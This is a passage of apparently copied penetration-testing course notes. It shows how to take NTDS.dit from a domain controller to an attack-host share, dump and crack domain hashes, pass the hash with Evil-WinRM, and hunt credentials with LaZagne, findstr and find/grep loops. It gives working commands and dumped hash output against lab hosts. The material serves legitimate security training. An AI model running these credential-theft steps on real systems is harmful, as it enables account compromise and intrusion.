<p>Now <code class="language-plaintext highlighter-rouge">cmd.exe /c move</code> can be used to move the file from the target DC to the share on our attack host.</p>

<p>Attacking Active Directory &amp; NTDS.dit</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\N</span>TDS&gt; cmd.exe /c move C:<span class="se">\N</span>TDS<span class="se">\N</span>TDS.dit <span class="se">\\</span>10.10.15.30<span class="se">\C</span>ompData 

        1 file<span class="o">(</span>s<span class="o">)</span> moved.		
</code></pre></div></div>

<h4 id="a-faster-method-using-cme-to-capture-ntdsdit">A Faster Method: Using cme to Capture NTDS.dit</h4>

<p>Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.</p>

<p>Attacking Active Directory &amp; NTDS.dit</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>crackmapexec smb 10.129.201.57 <span class="nt">-u</span> bwilliamson <span class="nt">-p</span> P@55w0rd! <span class="nt">--ntds</span>

SMB         10.129.201.57    445     DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:inlanefrieght.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.201.57    445     DC01             <span class="o">[</span>+] inlanefrieght.local<span class="se">\b</span>williamson:P@55w0rd! <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.129.201.57    445     DC01             <span class="o">[</span>+] Dumping the NTDS, this could take a <span class="k">while </span>so go grab a redbull...
SMB         10.129.201.57    445     DC01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.201.57    445     DC01           DC01<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
SMB         10.129.201.57    445     DC01           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local<span class="se">\j</span>im:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
SMB         10.129.201.57    445     DC01           WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
SMB         10.129.201.57    445     DC01           WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
SMB         10.129.201.57    445     DC01           WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
SMB         10.129.201.57    445     DC01           WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
SMB         10.129.201.57    445     DC01           WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local<span class="se">\b</span>williamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local<span class="se">\b</span>burgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local<span class="se">\j</span>stevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local<span class="se">\j</span>johnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local<span class="se">\j</span>doe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
SMB         10.129.201.57    445     DC01           Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
SMB         10.129.201.57    445     DC01           Administrator:des-cbc-md5:618c1c5ef780cde3
SMB         10.129.201.57    445     DC01           DC01<span class="nv">$:</span>aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
SMB         10.129.201.57    445     DC01           DC01<span class="nv">$:</span>aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
SMB         10.129.201.57    445     DC01           DC01<span class="nv">$:</span>des-cbc-md5:a2852362e50eae92
SMB         10.129.201.57    445     DC01           krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
SMB         10.129.201.57    445     DC01           krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
SMB         10.129.201.57    445     DC01           krbtgt:des-cbc-md5:9bd5017fdcea8fae
SMB         10.129.201.57    445     DC01           inlanefrieght.local<span class="se">\j</span>im:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
SMB         10.129.201.57    445     DC01           inlanefrieght.local<span class="se">\j</span>im:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
SMB         10.129.201.57    445     DC01           inlanefrieght.local<span class="se">\j</span>im:des-cbc-md5:79ab08755b32dfb6
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
     <span class="o">[</span>+] Dumped 61 NTDS hashes to /home/bob/.cme/logs/DC01_10.10.15.30_2022-01-19_133529.ntds of which 15 were added to the database
</code></pre></div></div>

<hr />

<h2 id="cracking-hashes--gaining-credentials">Cracking Hashes &amp; Gaining Credentials</h2>

<p>We can proceed with creating a text file containing all the NT hashes, or we can individually copy &amp; paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext.</p>

<h4 id="cracking-a-single-hash-with-hashcat">Cracking a Single Hash with Hashcat</h4>

<p>Attacking Active Directory &amp; NTDS.dit</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>hashcat <span class="nt">-m</span> 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
</code></pre></div></div>

<p>In many of the techniques we have covered so far, we have had success in cracking hashes we’ve obtained.</p>

<p><code class="language-plaintext highlighter-rouge">What if we are unsuccessful in cracking a hash?</code></p>

<hr />

<h2 id="pass-the-hash-considerations">Pass-the-Hash Considerations</h2>

<p>We can still use hashes to attempt to authenticate with a system using a type of attack called <code class="language-plaintext highlighter-rouge">Pass-the-Hash</code> (<code class="language-plaintext highlighter-rouge">PtH</code>). A PtH attack takes advantage of the <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials">NTLM authentication protocol</a> to authenticate a user using a password hash. Instead of <code class="language-plaintext highlighter-rouge">username</code>:<code class="language-plaintext highlighter-rouge">clear-text password</code> as the format for login, we can instead use <code class="language-plaintext highlighter-rouge">username</code>:<code class="language-plaintext highlighter-rouge">password hash</code>. Here is an example of how this would work:</p>

<h4 id="pass-the-hash-with-evil-winrm-example">Pass-the-Hash with Evil-WinRM Example</h4>

<p>Attacking Active Directory &amp; NTDS.dit</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.129.201.57  <span class="nt">-u</span>  Administrator <span class="nt">-H</span> <span class="s2">"64f12cddaa88057e06a81b54e73b949b"</span>
</code></pre></div></div>

<p>We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target. More on PtH will be covered in the module <code class="language-plaintext highlighter-rouge">AD Enumeration and Attacks</code>.</p>

<hr />

<h1 id="credential-hunting-in-windows">Credential Hunting in Windows</h1>

<p>Once we have access to a target Windows machine through the GUI or CLI, we can significantly benefit from incorporating credential hunting into our approach. <code class="language-plaintext highlighter-rouge">Credential Hunting</code> is the process of performing detailed searches across the file system and through various applications to discover credentials. To understand this concept, let’s place ourselves in a scenario. We have gained access to an IT admin’s Windows 10 workstation through RDP.</p>

<h5 id="search-centric">Search Centric</h5>

<p>Many of the tools available to us in Windows have search functionality. In this day and age, there are search-centric features built into most applications and operating systems, so we can use this to our advantage on an engagement. A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files. It would be wise to base our search for credentials on what we know about how the target system is being used. In this case, we know we have access to an IT admin’s workstation.</p>

<p><code class="language-plaintext highlighter-rouge">What might an IT admin be doing on a day-to-day basis &amp; which of those tasks may require credentials?</code></p>

<p>We can use this question &amp; consideration to refine our search to reduce the need for random guessing as much as possible.</p>

<h6 id="key-terms-to-search">Key Terms to Search</h6>

<p>Whether we end up with access to the GUI or CLI, we know we will have some tools to use for searching but of equal importance is what exactly we are searching for. Here are some helpful key terms we can use that can help us discover some credentials:</p>

<table>
  <thead>
    <tr>
      <th> </th>
      <th> </th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Passwords</td>
      <td>Passphrases</td>
      <td>Keys</td>
    </tr>
    <tr>
      <td>Username</td>
      <td>User account</td>
      <td>Creds</td>
    </tr>
    <tr>
      <td>Users</td>
      <td>Passkeys</td>
      <td>Passphrases</td>
    </tr>
    <tr>
      <td>configuration</td>
      <td>dbcredential</td>
      <td>dbpassword</td>
    </tr>
    <tr>
      <td>pwd</td>
      <td>Login</td>
      <td>Credentials</td>
    </tr>
  </tbody>
</table>

<p>Let’s use some of these key terms to search on the IT admin’s workstation.</p>

<hr />

<h2 id="search-tools">Search Tools</h2>

<p>With access to the GUI, it is worth attempting to use <code class="language-plaintext highlighter-rouge">Windows Search</code> to find files on the target using some of the keywords mentioned above.</p>

<p><img src="https://academy.hackthebox.com/storage/modules/147/WindowsSearch.png" alt="Windows search for 'pass' showing 'Change your password' in system settings and related options." /></p>

<p>By default, it will search various OS settings and the file system for files &amp; applications containing the key term entered in the search bar.</p>

<p>We can also take advantage of third-party tools like <a href="https://github.com/AlessandroZ/LaZagne">Lazagne</a> to quickly discover credentials that web browsers or other installed applications may insecurely store. It would be beneficial to keep a <a href="https://github.com/AlessandroZ/LaZagne/releases/">standalone copy</a> of Lazagne on our attack host so we can quickly transfer it over to the target. <code class="language-plaintext highlighter-rouge">Lazagne.exe</code> will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using <code class="language-plaintext highlighter-rouge">xfreerdp</code> all we must do is copy and paste into the RDP session we have established.</p>

<p>Once Lazagne.exe is on the target, we can open command prompt or PowerShell, navigate to the directory the file was uploaded to, and execute the following command:</p>

<h4 id="running-lazagne-all">Running Lazagne All</h4>

<p>Credential Hunting in Windows</p>

<pre><code class="language-cmd-session">C:\Users\bob\Desktop&gt; start lazagne.exe all
</code></pre>

<p>This will execute Lazagne and run <code class="language-plaintext highlighter-rouge">all</code> included modules. We can include the option <code class="language-plaintext highlighter-rouge">-vv</code> to study what it is doing in the background. Once we hit enter, it will open another prompt and display the results.</p>

<h4 id="lazagne-output">Lazagne Output</h4>

<p>Credential Hunting in Windows</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|<span class="o">====================================================================</span>|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          <span class="o">!</span> BANG BANG <span class="o">!</span>                             |
|                                                                    |
|<span class="o">====================================================================</span>|


<span class="c">########## User: bob ##########</span>

<span class="nt">-------------------</span> Winscp passwords <span class="nt">-----------------</span>

<span class="o">[</span>+] Password found <span class="o">!!!</span>
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
</code></pre></div></div>

<p>If we used the <code class="language-plaintext highlighter-rouge">-vv</code> option, we would see attempts to gather passwords from all Lazagne’s supported software. We can also look on the GitHub page under the supported software section to see all the software Lazagne will try to gather credentials from. It may be a bit shocking to see how easy it can be to obtain credentials in clear text. Much of this can be attributed to the insecure way many applications store credentials.</p>

<h4 id="using-findstr">Using findstr</h4>

<p>We can also use <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr">findstr</a> to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:</p>

<p>Credential Hunting in Windows</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\&gt;</span> findstr /SIM /C:<span class="s2">"password"</span> <span class="k">*</span>.txt <span class="k">*</span>.ini <span class="k">*</span>.cfg <span class="k">*</span>.config <span class="k">*</span>.xml <span class="k">*</span>.git <span class="k">*</span>.ps1 <span class="k">*</span>.yml
</code></pre></div></div>

<h2 id="additional-considerations">Additional Considerations</h2>

<p>There are thousands of tools &amp; key terms we could use to hunt for credentials on Windows operating systems. Know that which ones we choose to use will be primarily based on the function of the computer. If we land on a Windows Server OS, we may use a different approach than if we land on a Windows Desktop OS. Always be mindful of how the system is being used, and this will help us know where to look. Sometimes we may even be able to find credentials by navigating and listing directories on the file system as our tools run.</p>

<p>Here are some other places we should keep in mind when credential hunting:</p>

<ul>
  <li>Passwords in Group Policy in the SYSVOL share</li>
  <li>Passwords in scripts in the SYSVOL share</li>
  <li>Password in scripts on IT shares</li>
  <li>Passwords in web.config files on dev machines and IT shares</li>
  <li>unattend.xml</li>
  <li>Passwords in the AD user or computer description fields</li>
  <li>KeePass databases –&gt; pull hash, crack and get loads of access.</li>
  <li>Found on user systems and shares</li>
  <li>Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, <a href="https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration">Sharepoint</a></li>
</ul>

<hr />

<h2 id="credential-hunting-in-linux">Credential Hunting in Linux</h2>

<p>Hunting for credentials is one of the first steps once we have access to the system. These low-hanging fruits can give us elevated privileges within seconds or minutes. Among other things, this is part of the local privilege escalation process that we will cover here. However, it is important to note here that we are far from covering all possible situations and therefore focus on the different approaches.</p>

<p>We can imagine that we have successfully gained access to a system via a vulnerable web application and have therefore obtained a reverse shell, for example. Therefore, to escalate our privileges most efficiently, we can search for passwords or even whole credentials that we can use to log in to our target. There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:</p>

<table>
  <thead>
    <tr>
      <th><strong><code class="language-plaintext highlighter-rouge">Files</code></strong></th>
      <th><strong><code class="language-plaintext highlighter-rouge">History</code></strong></th>
      <th><strong><code class="language-plaintext highlighter-rouge">Memory</code></strong></th>
      <th><strong><code class="language-plaintext highlighter-rouge">Key-Rings</code></strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Configs</td>
      <td>Logs</td>
      <td>Cache</td>
      <td>Browser stored credentials</td>
    </tr>
    <tr>
      <td>Databases</td>
      <td>Command-line History</td>
      <td>In-memory Processing</td>
      <td> </td>
    </tr>
    <tr>
      <td>Notes</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>Scripts</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>Source codes</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>Cronjobs</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>SSH Keys</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>Enumerating all these categories will allow us to increase the probability of successfully finding out with some ease credentials of existing users on the system. There are countless different situations in which we will always see different results. Therefore, we should adapt our approach to the circumstances of the environment and keep the big picture in mind. Above all, it is crucial to keep in mind how the system works, its focus, what purpose it exists for, and what role it plays in the business logic and the overall network. For example, suppose it is an isolated database server. In that case, we will not necessarily find normal users there since it is a sensitive interface in the management of data to which only a few people are granted access.</p>

<hr />

<h2 id="files">Files</h2>

<p>One core principle of Linux is that everything is a file. Therefore, it is crucial to keep this concept in mind and search, find and filter the appropriate files according to our requirements. We should look for, find, and inspect several categories of files one by one. These categories are the following:</p>

<table>
  <thead>
    <tr>
      <th><strong><code class="language-plaintext highlighter-rouge">Files</code></strong></th>
      <th><strong><code class="language-plaintext highlighter-rouge">History</code></strong></th>
      <th><strong><code class="language-plaintext highlighter-rouge">Memory</code></strong></th>
      <th><strong><code class="language-plaintext highlighter-rouge">Key-Rings</code></strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Configs</td>
      <td>Logs</td>
      <td>Cache</td>
      <td>Browser stored credentials</td>
    </tr>
    <tr>
      <td>Databases</td>
      <td>Command-line History</td>
      <td>In-memory Processing</td>
      <td> </td>
    </tr>
    <tr>
      <td>Notes</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>Scripts</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>Source codes</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>Cronjobs</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>SSH Keys</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>Configuration files are the core of the functionality of services on Linux distributions. Often they even contain credentials that we will be able to read. Their insight also allows us to understand how the service works and its requirements precisely. Usually, the configuration files are marked with the following three file extensions (<code class="language-plaintext highlighter-rouge">.config</code>, <code class="language-plaintext highlighter-rouge">.conf</code>, <code class="language-plaintext highlighter-rouge">.cnf</code>). However, these configuration files or the associated extension files can be renamed, which means that these file extensions are not necessarily required. Furthermore, even when recompiling a service, the required filename for the basic configuration can be changed, which would result in the same effect. However, this is a rare case that we will not encounter often, but this possibility should not be left out of our search.</p>

<p>The most crucial part of any system enumeration is to obtain an overview of it. Therefore, the first step should be to find all possible configuration files on the system, which we can then examine and analyze individually in more detail. There are many methods to find these configuration files, and with the following method, we will see we have reduced our search to these three file extensions.</p>

<h4 id="configuration-files">Configuration Files</h4>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="k">for </span>l <span class="k">in</span> <span class="si">$(</span><span class="nb">echo</span> <span class="s2">".conf .config .cnf"</span><span class="si">)</span><span class="p">;</span><span class="k">do </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">File extension: "</span> <span class="nv">$l</span><span class="p">;</span> find / <span class="nt">-name</span> <span class="k">*</span><span class="nv">$l</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"lib</span><span class="se">\|</span><span class="s2">fonts</span><span class="se">\|</span><span class="s2">share</span><span class="se">\|</span><span class="s2">core"</span> <span class="p">;</span><span class="k">done</span>
<span class="go">
File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/usr/src/linux-headers-5.13.0-27-generic/.config
/usr/src/linux-headers-5.11.0-27-generic/.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config
/home/cry0l1t3/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/ssl/openssl.cnf
/etc/alternatives/my.cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
</span></code></pre></div></div>

<p>Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (<code class="language-plaintext highlighter-rouge">user</code>, <code class="language-plaintext highlighter-rouge">password</code>, <code class="language-plaintext highlighter-rouge">pass</code>) in each file with the file extension <code class="language-plaintext highlighter-rouge">.cnf</code>.</p>

<h4 id="credentials-in-configuration-files">Credentials in Configuration Files</h4>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>find / <span class="nt">-name</span> <span class="k">*</span>.cnf 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"doc</span><span class="se">\|</span><span class="s2">lib"</span><span class="si">)</span><span class="p">;</span><span class="k">do </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">File: "</span> <span class="nv">$i</span><span class="p">;</span> <span class="nb">grep</span> <span class="s2">"user</span><span class="se">\|</span><span class="s2">password</span><span class="se">\|</span><span class="s2">pass"</span> <span class="nv">$i</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"</span><span class="se">\#</span><span class="s2">"</span><span class="p">;</span><span class="k">done</span>
<span class="go">
File:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf
</span></code></pre></div></div>

<p>We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.</p>

<h4 id="databases">Databases</h4>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="k">for </span>l <span class="k">in</span> <span class="si">$(</span><span class="nb">echo</span> <span class="s2">".sql .db .*db .db*"</span><span class="si">)</span><span class="p">;</span><span class="k">do </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">DB File extension: "</span> <span class="nv">$l</span><span class="p">;</span> find / <span class="nt">-name</span> <span class="k">*</span><span class="nv">$l</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"doc</span><span class="se">\|</span><span class="s2">lib</span><span class="se">\|</span><span class="s2">headers</span><span class="se">\|</span><span class="s2">share</span><span class="se">\|</span><span class="s2">man"</span><span class="p">;</span><span class="k">done</span>
<span class="go">
DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb
/home/cry0l1t3/.cache/tracker/meta.db
/home/cry0l1t3/.cache/tracker/ontologies.gvdb

DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.dbus
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db-shm
/home/cry0l1t3/.cache/tracker/meta.db-wal
/home/cry0l1t3/.cache/tracker/meta.db
</span></code></pre></div></div>

<p>Depending on the environment we are in and the purpose of the host we are on, we can often find notes about specific processes on the system. These often include lists of many different access points or even their credentials. However, it is often challenging to find notes right away if stored somewhere on the system and not on the desktop or in its subfolders. This is because they can be named anything and do not have to have a specific file extension, such as <code class="language-plaintext highlighter-rouge">.txt</code>. Therefore, in this case, we need to search for files including the <code class="language-plaintext highlighter-rouge">.txt</code> file extension and files that have no file extension at all.</p>

<h4 id="notes">Notes</h4>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span>find /home/<span class="k">*</span> <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s2">"*.txt"</span> <span class="nt">-o</span> <span class="o">!</span> <span class="nt">-name</span> <span class="s2">"*.*"</span>
<span class="go">
/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
...SNIP...
</span></code></pre></div></div>

<p>Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automatically. Otherwise, the administrator or developer would have to enter the corresponding password each time the script or the compiled program is called.</p>

<h4 id="scripts">Scripts</h4>

<p>Credential Hunting in Linux</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cry0l1t3@unixclient:~$</span><span class="w"> </span><span class="k">for </span>l <span class="k">in</span> <span class="si">$(</span><span class="nb">echo</span> <span class="s2">".py .pyc .pl .go .jar .c .sh"</span><span class="si">)</span><span class="p">;</span><span class="k">do </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">File extension: "</span> <span class="nv">$l</span><span class="p">;</span> find / <span class="nt">-name</span> <span class="k">*</span><span class="nv">$l</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"doc</span><span class="se">\|</span><span class="s2">lib</span><span class="se">\|</span><span class="s2">headers</span><span class="se">\|</span><span class="s2">share"</span><span class="p">;</span><span class="k">done</span>
<span class="go">
File extension:  .py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
...SNIP...
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh
</span></code></pre></div></div>

<p>Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (<code class="language-plaintext highlighter-rouge">/etc/crontab</code>) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (<code class="language-plaintext highlighter-rouge">/etc/cron.daily</code>, <code class="language-plaintext highlighter-rouge">/etc/cron.hourly</code>, <code class="language-plaintext highlighter-rouge">/etc/cron.monthly</code>, <code class="language-plaintext highlighter-rouge">/etc/cron.weekly</code>). The scripts and files used by <code class="language-plaintext highlighter-rouge">cron</code> can also be found in <code class="language-plaintext highlighter-rouge">/etc/cron.d/</code> for Debian-based distributions.</p>

<h4 id="cronjobs">Cronjobs</h4>

<p>Credential Hunting in Linux</p>

